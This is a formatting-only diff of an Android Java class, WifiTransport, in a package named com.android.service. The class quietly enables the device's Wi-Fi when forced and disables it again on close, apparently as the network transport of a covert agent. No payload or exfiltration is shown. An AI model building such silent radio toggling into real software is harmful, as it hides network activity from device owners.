@@ -21,14 +21,14 @@ import com.android.service.util.Check;
  * The Class WifiTransport.
  */
 public class WifiTransport extends HttpKeepAliveTransport {
-	private static final String TAG = "WifiTransport";
+	private static final String TAG = "WifiTransport"; //$NON-NLS-1$
 	/** The forced. */
 	private boolean forced;
 	private boolean switchedOn;
 
 	final String service = Context.WIFI_SERVICE;
 	final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(service);
-	
+
 	/**
 	 * Instantiates a new wifi transport.
 	 * 
@@ -59,15 +59,15 @@ public class WifiTransport extends HttpKeepAliveTransport {
 	 */
 	@Override
 	public boolean isAvailable() {
-		
 
 		boolean available = wifi.isWifiEnabled();
 		if (!wifi.isWifiEnabled()) {
 			if (forced && wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING) {
-				if (Cfg.DEBUG)
-					Check.log(TAG + " try to enable wifi");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " try to enable wifi") ;//$NON-NLS-1$
+				}
 				available = wifi.setWifiEnabled(true);
-				switchedOn=available;
+				switchedOn = available;
 			}
 		}
 
@@ -77,14 +77,14 @@ public class WifiTransport extends HttpKeepAliveTransport {
 
 		return available;
 	}
-	
+
 	@Override
 	public void close() {
 		super.close();
-		if(switchedOn){
+		if (switchedOn) {
 			final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(service);
 			wifi.setWifiEnabled(false);
-			switchedOn=false;
+			switchedOn = false;
 		}
 	}
 
